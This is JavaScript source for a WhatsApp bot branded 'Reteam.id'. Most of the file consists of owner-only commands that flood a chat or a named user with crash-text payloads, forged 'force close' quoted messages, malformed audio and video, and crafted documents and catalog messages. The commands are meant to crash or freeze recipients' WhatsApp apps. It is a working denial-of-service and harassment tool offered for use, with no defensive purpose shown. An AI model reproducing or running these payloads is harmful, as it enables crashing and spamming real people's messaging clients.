...
//=================================================//
//================================================================================\\
const bugquoted = { key: { fromMe: true, participant: `6281331265675@s.whatsapp.net`, ...({ remoteJid: "" }) }, message: { "imageMessage": { "mimetype": "image/jpeg", "caption": `By : Reteam.id !`, "jpegThumbnail": thumb}}}
const bugfc = {key: { fromMe: false, participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) }, message: { "imageMessage": { "mimetype": "image/jpeg", "caption": `Force Close By Reteam.id`, "jpegThumbnail": thumb}}}
...
//==========================================\\
const { virtex1, virtag, philip, emoji1, emoji2, virtex2, virtex3, virtex4, virtex5, virtex8, virtex9, virtex10, virtex11, virtex12, slayer, virtexbytsukasa } = require('./virtex/virtex.js')
...
//=============================================\\
const replay = (teks) => {
  haikal.relayMessage(m.chat, { requestPaymentMessage: { noteMessage: { extendedTextMessage: { text: teks, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})
}
//=================================================//
// Function
const cerpen = require('./baseikal/lib/cerpen')
wm = 'POWERED BY RETEAM ID'
//=================================================//
// Time & Date
...
"message": {
"extendedTextMessage": {
"text": "© POWERED BY RETEAM.ID",
"previewType": "NONE",
"contextInfo": {
"stanzaId": "3EB0382EDBB2",
"participant": "6281331265675@s.whatsapp.net"
}}}}
//=================================================//
const kal = { 
key: {
...
"fileName": `POWERED BY RETEAM ID${ngazap(prefix)}`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
}}}
//=================================================//
//=================================================//
const bal= (teks) => {
haikal.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `POWERED BY RETEAM.ID${ngazap(prefix)}`,"body": `POWERED BY RETEAM.ID${ngazap(prefix)}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": kalimage,"sourceUrl": `https://chat.whatsapp.com/F7c22yAwu9Z3NAQpyhSlSS`}}}, { quoted: doc })
} 
const bangkal= (teks) => {
haikal.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `SC POWERED BY RETEAM ID`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": kalimage,"sourceUrl": `https://chat.whatsapp.com/F7c22yAwu9Z3NAQpyhSlSS`}}}, { quoted: hw })
} 
// Target
const reply = (teks) => {
return haikal.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `SC POWERED BY RETEAM ID`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": kalimage,"sourceUrl": `https://chat.whatsapp.com/F7c22yAwu9Z3NAQpyhSlSS`}}}, { quoted: hw })
} 
//=================================================//
 //Resize Location
...
let user = global.db.data.users[m.sender]
bangkal(`
RC MODDER Mods${user.afkReason ? ' Baiklah ' + user.afkReason : ''}
...
{
reply('*Loading...*')
await haikal.sendMessage(from, { text: virtexbytsukasa },{ quoted: bugquoted })                 
await haikal.sendMessage(from, { text: virtex1 },{ quoted: bugquoted })             
await haikal.sendMessage(from, { text: virtex2 },{ quoted: bugquoted })        
await haikal.sendMessage(from, { text: virtex3 },{ quoted: bugquoted })     
await haikal.sendMessage(from, { text: virtex4 },{ quoted: bugquoted })               
await haikal.sendMessage(from, { text: virtex5 },{ quoted: bugquoted })      
await haikal.sendMessage(from, { text: virtex6 },{ quoted: bugquoted }) 
await haikal.sendMessage(from, { text: virtex7 },{ quoted: bugquoted })    
await haikal.sendMessage(from, { text: virtex8 },{ quoted: bugquoted })             
await haikal.sendMessage(from, { text: virtex9 },{ quoted: bugquoted })        
await haikal.sendMessage(from, { text: virtex10 },{ quoted: bugquoted })     
await haikal.sendMessage(from, { text: virtex11 },{ quoted: bugquoted })               
await haikal.sendMessage(from, { text: virtex12 },{ quoted: bugquoted })      
await haikal.sendMessage(from, { text: philip },{ quoted: bugquoted }) 
await haikal.sendMessage(from, { text: slayer },{ quoted: bugquoted })  
await haikal.sendMessage(from, { text: ngazap },{ quoted: bugquoted }) 
await haikal.sendMessage(from, { text: ngazapv1 },{ quoted: bugquoted }) 
await haikal.sendMessage(from, { text: ngazapv2 },{ quoted: bugquoted }) 
await haikal.sendMessage(from, { text: ngazapv3 },{ quoted: bugquoted }) 
}
break
//=================================================//
case 'spambug2':
...
{
reply('*Loading...*')
await haikal.sendMessage(from, { text: virtexbytsukasa },{ quoted: doc })                 
await haikal.sendMessage(from, { text: virtex1 },{ quoted: doc })             
await haikal.sendMessage(from, { text: virtex2 },{ quoted: doc })        
await haikal.sendMessage(from, { text: virtex3 },{ quoted: doc })     
await haikal.sendMessage(from, { text: virtex4 },{ quoted: doc })               
await haikal.sendMessage(from, { text: virtex5 },{ quoted: doc })      
await haikal.sendMessage(from, { text: virtex6 },{ quoted: doc }) 
await haikal.sendMessage(from, { text: virtex7 },{ quoted: doc })    
await haikal.sendMessage(from, { text: virtex8 },{ quoted: doc })             
await haikal.sendMessage(from, { text: virtex9 },{ quoted: doc })        
await haikal.sendMessage(from, { text: virtex10 },{ quoted: doc })     
await haikal.sendMessage(from, { text: virtex11 },{ quoted: doc })               
await haikal.sendMessage(from, { text: virtex12 },{ quoted: doc })      
await haikal.sendMessage(from, { text: philip },{ quoted: doc }) 
await haikal.sendMessage(from, { text: slayer },{ quoted: doc })  
await haikal.sendMessage(from, { text: ngazap },{ quoted: doc }) 
await haikal.sendMessage(from, { text: ngazapv1 },{ quoted: doc }) 
await haikal.sendMessage(from, { text: ngazapv2 },{ quoted: doc }) 
await haikal.sendMessage(from, { text: ngazapv3 },{ quoted: doc }) 
}
break
//=================================================//
case 'spambu3':
if (!isCreator) throw sticOwner(from)
if (isBan) throw sticBanLu(from)
await haikal.sendMessage(from, { text: virtex8 }, { quoted: bugfc });
await haikal.sendMessage(from, { text: virtex8 }, { quoted: bugfc });
await haikal.sendMessage(from, { text: virtex8 }, { quoted: bugfc });
await haikal.sendMessage(from, { text: virtex8 }, { quoted: bugfc });
await haikal.sendMessage(from, { text: virtex8 }, { quoted: bugfc });
...
{
reply('*Loading...*')
await haikal.sendMessage(from, { text: virtexbytsukasa },{ quoted: hw })                 
await haikal.sendMessage(from, { text: virtex1 },{ quoted: hw })             
await haikal.sendMessage(from, { text: virtex2 },{ quoted: hw })        
await haikal.sendMessage(from, { text: virtex3 },{ quoted: hw })     
await haikal.sendMessage(from, { text: virtex4 },{ quoted: hw })               
await haikal.sendMessage(from, { text: virtex5 },{ quoted: hw })      
await haikal.sendMessage(from, { text: virtex6 },{ quoted: hw }) 
await haikal.sendMessage(from, { text: virtex7 },{ quoted: hw })    
await haikal.sendMessage(from, { text: virtex8 },{ quoted: hw })             
await haikal.sendMessage(from, { text: virtex9 },{ quoted: hw })        
await haikal.sendMessage(from, { text: virtex10 },{ quoted: hw })     
await haikal.sendMessage(from, { text: virtex11 },{ quoted: hw })               
await haikal.sendMessage(from, { text: virtex12 },{ quoted: hw })      
await haikal.sendMessage(from, { text: philip },{ quoted: hw }) 
await haikal.sendMessage(from, { text: slayer },{ quoted: hw })  
await haikal.sendMessage(from, { text: ngazap },{ quoted: hw }) 
await haikal.sendMessage(from, { text: ngazapv1 },{ quoted: hw }) 
await haikal.sendMessage(from, { text: ngazapv2 },{ quoted: hw }) 
await haikal.sendMessage(from, { text: ngazapv3 },{ quoted: hw }) 
}
break
//=================================================//
case 'spambug5':
...
{
reply('*Loading...*')
await haikal.sendMessage(from, { text: virtexbytsukasa },{ quoted: kal })                 
await haikal.sendMessage(from, { text: virtex1 },{ quoted: kal })             
await haikal.sendMessage(from, { text: virtex2 },{ quoted: kal })        
await haikal.sendMessage(from, { text: virtex3 },{ quoted: kal })     
await haikal.sendMessage(from, { text: virtex4 },{ quoted: kal })               
await haikal.sendMessage(from, { text: virtex5 },{ quoted: kal })      
await haikal.sendMessage(from, { text: virtex6 },{ quoted: kal }) 
await haikal.sendMessage(from, { text: virtex7 },{ quoted: kal })    
await haikal.sendMessage(from, { text: virtex8 },{ quoted: kal })             
await haikal.sendMessage(from, { text: virtex9 },{ quoted: kal })        
await haikal.sendMessage(from, { text: virtex10 },{ quoted: kal })     
await haikal.sendMessage(from, { text: virtex11 },{ quoted: kal })               
await haikal.sendMessage(from, { text: virtex12 },{ quoted: kal })      
await haikal.sendMessage(from, { text: philip },{ quoted: kal }) 
await haikal.sendMessage(from, { text: slayer },{ quoted: kal })  
await haikal.sendMessage(from, { text: ngazap },{ quoted: kal }) 
await haikal.sendMessage(from, { text: ngazapv1 },{ quoted: kal }) 
await haikal.sendMessage(from, { text: ngazapv2 },{ quoted: kal }) 
await haikal.sendMessage(from, { text: ngazapv3 },{ quoted: kal }) 
}
break
//=================================================//
case 'spambug6':
...
{
reply('*Loading...*')
await haikal.sendMessage(from, { text: virtexbytsukasa },{ quoted: kel })                 
await haikal.sendMessage(from, { text: virtex1 },{ quoted: kel })             
await haikal.sendMessage(from, { text: virtex2 },{ quoted: kel })        
await haikal.sendMessage(from, { text: virtex3 },{ quoted: kel })     
await haikal.sendMessage(from, { text: virtex4 },{ quoted: kel })               
await haikal.sendMessage(from, { text: virtex5 },{ quoted: kel })      
await haikal.sendMessage(from, { text: virtex6 },{ quoted: kel }) 
await haikal.sendMessage(from, { text: virtex7 },{ quoted: kel })    
await haikal.sendMessage(from, { text: virtex8 },{ quoted: kel })             
await haikal.sendMessage(from, { text: virtex9 },{ quoted: kel })        
await haikal.sendMessage(from, { text: virtex10 },{ quoted: kel })     
await haikal.sendMessage(from, { text: virtex11 },{ quoted: kel })               
await haikal.sendMessage(from, { text: virtex12 },{ quoted: kel })      
await haikal.sendMessage(from, { text: philip },{ quoted: kel }) 
await haikal.sendMessage(from, { text: slayer },{ quoted: kel })  
await haikal.sendMessage(from, { text: ngazap },{ quoted: kel }) 
await haikal.sendMessage(from, { text: ngazapv1 },{ quoted: kel }) 
await haikal.sendMessage(from, { text: ngazapv2 },{ quoted: kel }) 
await haikal.sendMessage(from, { text: ngazapv3 },{ quoted: kel }) 
}
break
case 'spamngazap':
if (!isCreator) throw sticOwner(from)
...
if (!isCreator) throw sticOwner(from)
if (isBan) throw sticBanLu(from)
haikal.sendMessage(from, { video: {url : `https://d.top4top.io/m_2308utcfr2.mp4`}, caption:`${virtex8}`, mimetype: 'video/mp4', duration: 359996400, ptt:true}, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
}
break
//=================================================//
case 'bugvid4':{
if (!isCreator) throw sticOwner(from)
if (isBan) throw sticBanLu(from)
haikal.sendMessage(from, { video: {url : `https://e.top4top.io/m_2308k6low3.mp4`}, caption:`${pushname}\n${virtex8}`, mimetype: 'video/mp4', duration: 359996400, ptt:true}, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
}
break
//=================================================//
case 'bugvid5':{
if (!isCreator) throw sticOwner(from)
if (isBan) throw sticBanLu(from)
haikal.sendMessage(from, { video: {url : `https://a.top4top.io/m_2363ady120.mp4`}, caption:`${virtex8}\n${virtex8}`, mimetype: 'video/mp4', duration: 359996400, ptt:true}, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
}
break
//=================================================//
case 'bugvn1':{
if (!isCreator) throw sticOwner(from)
if (isBan) throw sticBanLu(from)
haikal.sendMessage(from, { audio: {url : `https://j.top4top.io/m_2319rrfpx1.mp3`}, mimetype: 'audio/mp4', duration: 359996400, ptt:true}, { quoted: doc }) 
}
break
//=================================================//
case 'bugvn2':{
if (!isCreator) throw sticOwner(from)
if (isBan) throw sticBanLu(from)
haikal.sendMessage(from, { audio: {url : `https://k.top4top.io/m_23192ur3s2.mp3`}, mimetype: 'audio/mp4', duration: 359996400, ptt:true}, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
}
break
//=================================================//
case 'bugvn3':{
if (!isCreator) throw sticOwner(from)
if (isBan) throw sticBanLu(from)
haikal.sendMessage(from, { audio: {url : `https://l.top4top.io/m_2319dp4v33.mp3`}, mimetype: 'audio/mp4', duration: 359996400, ptt:true}, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
}
break
//=================================================//
case 'bugvn4':{
if (!isCreator) throw sticOwner(from)
if (isBan) throw sticBanLu(from)
haikal.sendMessage(from, { audio: {url : `https://a.top4top.io/m_2319jp65p4.mp3`}, mimetype: 'audio/mp4', duration: 359996400, ptt:true}, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
}
break
//=================================================//
case 'bugvn5':{
if (!isCreator) throw sticOwner(from)
if (isBan) throw sticBanLu(from)
haikal.sendMessage(from, { audio: {url : `https://l.top4top.io/m_2319xk12c0.mp3`}, mimetype: 'audio/mp4', duration: 359996400, ptt:true}, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
}
break
//=================================================//
case 'bugstik1':{
...
haikal.sendMessage(from, {sticker: bugstickv1}, { quoted: doc }) 
}
break
//=================================================//
case 'bugstik2':{
...
haikal.sendMessage(from, {sticker: bugstickv2}, { quoted: doc }) 
}
break
//=================================================//
case 'bugstik3':{
...
haikal.sendMessage(from, {sticker: bugstickv3}, { quoted: doc }) 
}
break
//=================================================//
case 'bugstik4':{
...
haikal.sendMessage(from, {sticker: bugstickv4}, { quoted: doc }) 
}
break
//=================================================//
case 'bugstik5':{
...
haikal.sendMessage(from, {sticker: bugstickv5}, { quoted: doc }) 
}
break
//=================================================//
case 'bugaudio1':{
...
haikal.sendMessage(from, {audio: bugaudiov1, mimetype: 'audio/mp4'}, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
}
break
//=================================================//
case 'bugaudio2':{
...
haikal.sendMessage(from, {audio: bugaudiov2, mimetype: 'audio/mp4'}, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
}
break
//=================================================//
case 'bugaudio3':{
...
haikal.sendMessage(from, {audio: bugaudiov3, mimetype: 'audio/mp4'}, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
}
break
//=================================================//
case 'bugaudio4':{
...
haikal.sendMessage(from, {audio: bugaudiov4, mimetype: 'audio/mp4'}, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
}
break
//=================================================//
case 'bugaudio5':{
...
haikal.sendMessage(from, {audio: bugaudiov5, mimetype: 'audio/mp4'}, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
}
break
//=================================================//
case 'ngebuggifv1': 
...
haikal.sendMessage(from, { video: nicko1, caption: `${virtex8}`,gifPlayback: true},{quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
break
//=================================================//
case 'ngebuggifv2': 	
if (!isCreator) throw sticOwner(from)
...
haikal.sendMessage(from, { video: nicko2, caption: `${ngazapv1}`,gifPlayback: true},{quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
break
//=================================================//
case 'ngebuggifv3': 	
if (!isCreator) throw sticOwner(from)
...
haikal.sendMessage(from, { video: nicko3, caption: `${ngazapv2}`,gifPlayback: true},{quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
break
//=================================================//
case 'ngebuggifv4': 	
if (!isCreator) throw sticOwner(from)
...
haikal.sendMessage(from, { video: nicko4, caption: `${ngazapv3}`,gifPlayback: true},{quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
break
//=================================================//
case 'ngebuggifv5': 	
if (!isCreator) throw sticOwner(from)
...
haikal.sendMessage(from, { video: nicko5, caption: `${virtex7}`,gifPlayback: true},{quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
break
//=================================================//
case 'ngebugcatalogv1': case 'ngebugkatalogv1':
if (!isCreator) throw sticOwner(from)
if (isBan) throw sticBanLu(from)
haikal.sendKatalog(from, virtex8, virtex8, thumb, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
break
//=================================================//
case 'ngebugcatalogv2': case 'ngebugkatalogv2':
if (!isCreator) throw sticOwner(from)
if (isBan) throw sticBanLu(from)
haikal.sendKatalog(from, virtex8, ngazapv1, thumb, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
break
//=================================================//
case 'ngebugcatalogv3': case 'ngebugkatalogv3':
if (!isCreator) throw sticOwner(from)
if (isBan) throw sticBanLu(from)
haikal.sendKatalog(from, virtex8, ngazapv2, thumb, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
break
//=================================================//
case 'ngebugcatalogv4': case 'ngebugkatalogv4':
if (!isCreator) throw sticOwner(from)
if (isBan) throw sticBanLu(from)
haikal.sendKatalog(from, virtex8, ngazapv3, thumb, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
break
//=================================================//
case 'ngebugv1':
if (!isCreator) throw sticOwner(from)
...
const ngebugv1 = `${q}
${virtex1}${ngazapv2}`
haikal.sendMessage(from, { text: ngebugv1 }, { quoted: doc }) 
break
//=================================================//
case 'ngebugv2':
if (!isCreator) throw sticOwner(from)
...
const ngebugv2 = `${q}
${virtex2}${ngazapv2}`
haikal.sendMessage(from, { text: ngebugv2 }, { quoted: doc }) 
break
//=================================================//
case 'ngebugv3':
if (!isCreator) throw sticOwner(from)
...
const ngebugv3 = `${q}
${virtex3}${ngazapv2}`
haikal.sendMessage(from, { text: ngebugv3 }, { quoted: doc }) 
break
//=================================================//
case 'ngebugv4':
if (!isCreator) throw sticOwner(from)
...
const ngebugv4 = `${q}
${virtex4}${ngazapv2}`
haikal.sendMessage(from, { text: ngebugv4 }, { quoted: doc }) 
break
//=================================================//
case 'ngebugv5':
if (!isCreator) throw sticOwner(from)
...
const ngebugv5 = `${q}
${virtex5}${ngazapv2}`
haikal.sendMessage(from, { text: ngebugv5 }, { quoted: doc }) 
break
//=================================================//
case 'ngebugv6':
if (!isCreator) throw sticOwner(from)
...
const ngebugv6 = `${q}
${virtex6}${ngazapv2}`
haikal.sendMessage(from, { text: ngebugv6 }, { quoted: doc }) 
break
//=================================================//
case 'ngebugv7':
if (!isCreator) throw sticOwner(from)
...
const ngebugv7 = `${q}
${virtex7}${ngazapv2}`
haikal.sendMessage(from, { text: ngebugv7 }, { quoted: doc }) 
break
//=================================================//
case 'ngebugv8':
if (!isCreator) throw sticOwner(from)
...
const ngebugv8 = `${q}
${virtex8}${ngazapv2}`
haikal.sendMessage(from, { text: ngebugv8 }, { quoted: doc }) 
break
//=================================================//
case 'ngebugv9':
if (!isCreator) throw sticOwner(from)
...
const ngebugv9 = `${q}
${virtex9}${ngazapv2}`
haikal.sendMessage(from, { text: ngebugv9 }, { quoted: doc }) 
break
//=================================================//
case 'ngebugv10':
if (!isCreator) throw sticOwner(from)
...
const ngebugv10 = `${q}
${virtex10}${ngazapv2}`
haikal.sendMessage(from, { text: ngebugv10 }, { quoted: doc }) 
break
//=================================================//
case 'ngebugv11':
if (!isCreator) throw sticOwner(from)
...
const ngebugv11 = `${q}
${virtex11}${ngazapv2}`
haikal.sendMessage(from, { text: ngebugv11 }, { quoted: doc }) 
break
//=================================================//
case 'ngebugv12':
if (!isCreator) throw sticOwner(from)
...
const ngebugv12 = `${q}
${virtex12}${ngazapv2}`
haikal.sendMessage(from, { text: ngebugv12 }, { quoted: doc }) 
break
//=================================================//
case 'ngebugv13':
if (!isCreator) throw sticOwner(from)
...
const ngebugv13 = `${q}
${virtag}${ngazapv2}`
haikal.sendMessage(from, { text: ngebugv13 }, { quoted: doc }) 
break
//=================================================//
case 'ngebugv14':
if (!isCreator) throw sticOwner(from)
...
const ngebugv14 = `${q}
${ngazapv1}${ngazapv2}`
haikal.sendMessage(from, { text: ngebugv14 }, { quoted: doc }) 
break
//=================================================//
case 'ngebugv15':
if (!isCreator) throw sticOwner(from)
...
const ngebugv15 = `📄.${q}                                                            📄.${q}@                                                                  
${ngazapv2}${ngazapv2}`
haikal.sendMessage(from, { text: ngebugv15 }, { quoted: doc }) 
break
//=================================================//
case 'ngebugv16':
if (!isCreator) throw sticOwner(from)
...
const ngebugv16 = `${q}
${ngazapv3}${ngazapv2}`
haikal.sendMessage(from, { text: ngebugv16 }, { quoted: doc }) 
break
//=================================================//
case 'bugmat':{
if (!isCreator) throw sticOwner(from)
...
await haikal.sendMessage(from, { document: bugmamaco, mimetype: 'application/txt', fileName: `🌞𖧹͓͜͜͡𝑴͜͡𝑨͜͡҉𝑴͜͡𝑨͜͡҉𝑪͜͡𝑶͜͡𖧹͓͓󠇞𞥊🌞.${virtex8}` }, { quoted: doc }) 
}
break
//=================================================//
case 'bugking':{
...
await haikal.sendMessage(from, { document: bugvk, mimetype: 'application/txt', fileName: `ꪶ𝑽𝑲ꫂ ꪶ𝑻𝑯𝑬ꫂ ꪶ𝑲𝑰𝑵𝑮ꫂ . ${virtex8}` }, { quoted: doc }) 
}
break
//=================================================//
case 'bugsun':{
...
await haikal.sendMessage(from, { document: bugsunshine, mimetype: 'application/txt', fileName: `🌤⃟⃘༜᪶𝑪𝑳͜𝑬𝑰𝑻͜𝑰𝑵ネ̷ْ𝑺͜𝑼𝑵𝑺𝑯͜𝑰𝑵𝑬༜᪶⃟⃘☀️.${virtex8}` }, { quoted: doc }) 
}
break
//=================================================//
case 'bugsilver':{
...
await haikal.sendMessage(from, { document: bugsilver, mimetype: 'application/txt', fileName: `😅࿆𑀁ᷓ𝀃⃬ꪲ༑ꪰ᷍💉ꪰ™S̸I̸L̸V̸E̸R̸Z̸I̸N̸G̸O̸D̸ • #T̺͆r̺͆o̺͆p̺͆a̺͆D̺͆o̺͆s̺͆G̺͆o̺͆d̺͆ 🤠࿆ᷓ${virtex8}` }, { quoted: doc }) 
}
break
//=================================================//
case 'kagas':{
...
await haikal.sendMessage(from, { document: buggas, mimetype: 'application/txt', fileName: `ᬉ🈀 🍩⇝͜͡✪ャ𐌾ձ𑂘𐌼оձձ𐐩𐔏ャ✪͜͡⇜🍩 🈀ᬉ͜.🍩ၘ${virtex8}` }, { quoted: doc }) 
}
break
//=================================================//
case 'bugcew':{
...
await haikal.sendMessage(from, { document: bugcleitin, mimetype: 'application/txt', fileName: `🥀࿙፝֟۫۫۫͝𝒄𝒍𝒆𝒊𝒕𝒊𝒏...𝀥🍷${virtex8}` }, { quoted: doc }) 
}
break
//=================================================//
case 'bugpdf':{
...
await haikal.sendMessage(from, { document: bugpdf, mimetype: 'application/pdf', fileName: `${virtex8}` }, { quoted: doc }) 
}
break
//=================================================//
case 'bugzip':{
...
await haikal.sendMessage(from, { document: bugzip, mimetype: 'application/zip', fileName: `${virtex8}` }, { quoted: doc }) 
}
break
//=================================================//
case 'bugpptx':{
...
await haikal.sendMessage(from, { document: bugpptx, mimetype: 'application/pptx', fileName: `${virtex8}` }, { quoted: doc }) 
}
break
//=================================================//
case 'bugxlsx':{
...
await haikal.sendMessage(from, { document: bugxlsx, mimetype: 'application/xlsx', fileName: `${virtex8}` }, { quoted: doc }) 
}
break
//=================================================//
case 'bugdocx':{
...
await haikal.sendMessage(from, { document: bugdocx, mimetype: 'application/docx', fileName: `${virtex8}` }, { quoted: doc }) 
}
break
//=================================================//
case 'troli2': {
...
"orderMessage": {
						...
						"status": "INQUIRY",
						"surface": "CATALOG",
						"message": `© POWERED BY RETEAM ID${ngazap(prefix)}`,
						"orderTitle": "Haikal",
						"sellerJid": "6281331265675@s.whatsapp.net",
...
"mimetype": "image/jpeg",
"caption": `© POWERED BY RETEAM ID${ngazap(prefix)}`,
...
"extendedTextMessage": {
"text": ` https://chat.whatsapp.com/F7c22yAwu9Z3NAQpyhSlSS\n\n© POWERED BY RETEAM ID`,
"matchedText": " https://chat.whatsapp.com/F7c22yAwu9Z3NAQpyhSlSS",
"description": "Undangan Grup WhatsApp",
"title": `© POWERED BY RETEAM ID${ngazap(prefix)}`,
"previewType": "NONE",					
}
}), { userJid: m.chat, quoted: doc })
...
var extended = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"extendedTextMessage": {
"text": "https://wa.me/c/6281331265675",
"matchedText": "https://wa.me/c/6281331265675",
"description": "Developer POWERED BY RETEAM ID\nWhatsApp / Script Bot \n\nORDER ? CHAT AJA 👋",
"title": `© POWERED BY RETEAM ID${ngazap(prefix)}`,
"previewType": "NONE",
"jpegThumbnail": messa.imageMessage,
}
...
case 'crash666':
if (!isCreator) return
ydd = `Created by reteam.id`
haikal.sendMessage(from, {text:ydd},{quoted: { 
key: { 
fromMe: false, 
...
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `awokawok crash by reteam.id`, 
"jpegThumbnail": thumb
}
}
}})
...
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
a = await haikal.sendMessage(m.chat, {react: { text: " ️", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
haikal.sendMessage(Pe, {text: "Xd"}, {quoted: bugfc})
await sleep(20)
haikal.sendMessage(Pe, {text: "Xd"}, {quoted: bugfc})
await sleep(20)
haikal.sendMessage(Pe, {text: "Xd"}, {quoted: bugfc})
...
"inviteExpiration": `MY NAME POWERED BY RETEAM ID${ngazap(prefix)}`,
"groupName": `MY NAME POWERED BY RETEAM ID${ngazap(prefix)}`,
...
"orderTitle": `© POWERED BY RETEAM ID${ngazap(prefix)}`,
"sellerJid": "6281331265675@s.whatsapp.net",
"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
"totalAmount1000": "10000000000000",
"totalCurrencyCode": "IDR",
}
}), { userJid: m.chat, quoted: doc })
...
"title": `© POWERED BY RETEAM ID${ngazap(prefix)}`,
"description": `© POWERED BY RETEAM ID`,
"currencyCode": "IDR",
"footerText": `© POWERED BY RETEAM ID`,
"priceAmount1000": "10000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": `© POWERED BY RETEAM ID`,
"url": "wa.me/6281331265675"
},
"businessOwnerJid": "6281331265675@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: doc })
...
